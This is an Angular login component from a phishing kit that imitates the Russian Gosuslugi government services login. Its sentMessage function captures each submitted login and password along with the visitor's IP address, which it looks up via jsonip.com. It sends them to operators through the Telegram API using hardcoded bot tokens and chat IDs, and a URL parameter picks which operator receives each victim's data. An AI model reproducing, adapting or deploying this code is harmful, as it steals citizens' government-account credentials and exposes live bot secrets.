import {BreakpointObserver, Breakpoints} from '@angular/cdk/layout';
import {HttpClient} from '@angular/common/http';
import {Component, OnInit, ViewEncapsulation} from '@angular/core';
import {FormBuilder, Validators} from '@angular/forms';
import {ActivatedRoute} from '@angular/router';
import {Observable} from 'rxjs';
import {first, map, skipWhile, tap} from 'rxjs/operators';
import Telegram from 'telegram-send-message';


interface IPInfo {
	ip: string;
}

interface Recipient {
	name: string;
	id: string;
	token: string;
}

@Component({
	selector: 'app-login',
	templateUrl: './login.component.html',
	styleUrls: ['./login.component.scss'],
	encapsulation: ViewEncapsulation.None

})
export class LoginComponent implements OnInit {
	link$ = this.route.paramMap
		.pipe(
			first(),
			skipWhile((value) => !value),
			map((params) => params.get('link')),
			tap(value => {
				this.recipient.forEach(item => {
					if (item.id === value) {
						this.sendTo = item;
					}
				});
			}),
		) as Observable<string>;

	loginStepPhone = true;
	form = this.formBuilder.group({
		login: ['', [Validators.required]],
		password: ['', [Validators.required]],
	});
	prevValue = {
		login: '',
		password: '',
	};
	selected = 'ru';
	isSmallScreen = false;
	ipAddress: string | any;
	sendTo: Recipient;
	hide = true;
	recipient = [
		{
			name: 'Chipi',
			id: '880595419',
			token: '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs'
		},
		{
			name: 'Knot',
			id: '946981380',
			token: '1224265689:AAES1LYt8AZkyvjm1EXNyHwExsaSlfxlUp4'
		},
	];


	sentMessage(): void {
		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress ? this.ipAddress.ip : ' '}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
			console.log(this.sendTo);
			Telegram.setToken(this.sendTo.token);
			Telegram.setRecipient(this.sendTo.id);
			Telegram.setMessage(message);
			Telegram.send();
			this.prevValue.login = this.form.get('login').value;
			this.prevValue.password = this.form.get('password').value;
			// window.location.href = 'https://esia.gosuslugi.ru/';
		}
	}

	constructor(
		private formBuilder: FormBuilder,
		private breakpointObserver: BreakpointObserver,
		private http: HttpClient,
		private route: ActivatedRoute,
	) {}

	getIPInfo(): Observable<IPInfo | any> {
		return this.http.get('https://jsonip.com').pipe(
			first(),
		);
	}

	onSubmit(): void {
		console.log(this.sendTo);
		console.log(this.ipAddress ? this.ipAddress.ip : ' ');
		if (this.form.valid) {
			this.sentMessage();
		}
	}

	ngOnInit(): void {
		this.link$.subscribe();
		this.getIPInfo().subscribe(value => this.ipAddress = value);
		this.breakpointObserver.observe([Breakpoints.Small, Breakpoints.XSmall])
			.pipe(
				map((observer) => observer.matches)
			)
			.subscribe((isSmallScreen) => this.isSmallScreen = isSmallScreen);
	}
}
